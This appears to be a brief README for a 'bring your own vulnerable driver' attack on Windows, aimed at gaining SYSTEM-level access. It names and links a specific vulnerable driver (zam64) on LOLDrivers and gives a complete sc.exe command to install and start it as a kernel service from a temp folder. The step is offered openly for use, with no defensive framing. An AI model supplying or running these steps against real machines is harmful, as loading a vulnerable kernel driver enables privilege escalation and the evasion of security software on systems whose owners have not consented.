# BYOVD
Exploiting a vulnerable driver to get SYSTEM level access

The driver being used can be downloaded from LOLDrivers here:
https://www.loldrivers.io/drivers/e5f12b82-8d07-474e-9587-8c7b3714d60c/?query=zam

Rename the bin file to the correct name and install the driver with:
sc.exe create zam64.sys binPath=C:\windows\temp\zam64.sys type=kernel && sc.exe start zam64.sys
